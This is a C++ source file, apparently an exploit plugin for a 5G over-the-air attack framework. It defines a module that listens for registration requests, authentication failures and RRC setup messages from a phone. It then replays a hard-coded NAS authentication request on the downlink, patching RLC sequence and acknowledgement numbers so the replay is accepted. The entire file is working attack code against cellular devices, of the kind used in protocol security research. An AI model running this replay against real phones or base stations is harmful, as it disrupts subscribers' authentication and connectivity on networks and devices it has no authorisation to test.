#include "shadower/hdr/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

const uint8_t authentication_request[] = {
    0x01, 0x03, 0x00, 0x01,
    0x00, // ACK 1
    0x01, 0x35, 0xc0, 0x01, 0x00, 0x01, 0x28, 0x85, 0x4f, 0xc0, 0x0a, 0xc0, 0x40, 0x40, 0x00, 0x04, 0x28,
    0x6a, 0x84, 0xbb, 0x43, 0xbc, 0xe1, 0xa9, 0x9f, 0x99, 0x8b, 0xcd, 0xc4, 0x4a, 0xab, 0x5c, 0x44, 0x02,
    0x0d, 0x8e, 0x58, 0x1e, 0x35, 0x61, 0x30, 0x00, 0x08, 0x61, 0xa8, 0x8f, 0xd4, 0x2f, 0x0b, 0xb8, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

class AuthenticationReplayExploit : public Exploit
{
public:
  AuthenticationReplayExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                              SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    auth_req.reset(
        new std::vector<uint8_t>(authentication_request, authentication_request + sizeof(authentication_request)));
  }

  void setup() override
  {
    f_registration_request   = wd_filter("nas_5gs.mm.message_type == 0x41");
    f_authentication_failure = wd_filter("nas_5gs.mm.message_type == 0x59");
    f_rrc_setup_request      = wd_filter("nr-rrc.c1 == 0");
    f_ack_sn                 = wd_field("rlc-nr.am.ack-sn");
    f_sn                     = wd_field("rlc-nr.am.sn");
    f_nack_sn                = wd_field("rlc-nr.am.nack-sn");
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_filter(wd, f_registration_request);
    wd_register_filter(wd, f_authentication_failure);
    wd_register_filter(wd, f_rrc_setup_request);
    wd_register_field(wd, f_ack_sn);
    wd_register_field(wd, f_sn);
    wd_register_field(wd, f_nack_sn);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL) {
      // If ACK SN from UE received, then update the sequence number to new sequence number
      wd_field_info_t ack_sn_info = wd_read_field(wd, f_ack_sn);
      if (ack_sn_info) {
        uint32_t ack_sn_recv = packet_read_field_uint32(ack_sn_info);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
          logger.info(YELLOW "Update sequence number to %u" RESET, dl_sn);
        }
      }

      // If UL message received from the base station, then we have to send the ACK back to UE
      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        uint32_t sn_recv = packet_read_field_uint32(sn_info);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv + 1;
          logger.info(YELLOW "Update ACK sequence number to %u" RESET, dl_sn);
        }
        if (sn_recv == 0) {
          logger.info(YELLOW "Received registration request" RESET);
          replay_authentication_request(logger);
          return;
        }
      }

      wd_field_info_t nack_sn_info = wd_read_field(wd, f_nack_sn);
      if (nack_sn_info) {
        uint32_t nack_sn_recv = packet_read_field_uint32(nack_sn_info);
        dl_sn                 = nack_sn_recv;
        logger.info(YELLOW "Update sequence number to NACK %u" RESET, dl_sn);
        replay_authentication_request(logger);
      }
    }

    if (wd_read_filter(wd, f_rrc_setup_request)) {
      // Reset the sequence number
      dl_sn     = 0;
      dl_ack_sn = 1;
    }

    // if registration request detected, then replay the authentication request
    if (wd_read_filter(wd, f_registration_request)) {
      logger.info(YELLOW "Received registration request" RESET);
      replay_authentication_request(logger);
      return;
    }

    if (wd_read_filter(wd, f_authentication_failure)) {
      logger.info(YELLOW "Received authentication failure" RESET);
      replay_authentication_request(logger);
      return;
    }
  }

private:
  void replay_authentication_request(srslog::basic_logger& logger)
  {
    if (auth_req->empty()) {
      return;
    }
    // auth_req->data()[3] = dl_sn & 0xff;
    // auth_req->data()[5] = dl_sn & 0xff;

    auth_req->data()[3]  = dl_ack_sn & 0xff;
    auth_req->data()[8]  = dl_sn & 0xff;
    auth_req->data()[10] = dl_sn & 0xff;
    dl_buffer_queue.push(auth_req);
    logger.info(YELLOW "Replay authentication request" RESET);
  }

  wd_filter_t f_registration_request;
  wd_filter_t f_authentication_failure;
  wd_filter_t f_rrc_setup_request;
  wd_field_t  f_ack_sn;
  wd_field_t  f_sn;
  wd_field_t  f_nack_sn;
  uint32_t    dl_sn     = 0;
  uint32_t    dl_ack_sn = 2;

  std::shared_ptr<std::vector<uint8_t> > auth_req;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new AuthenticationReplayExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}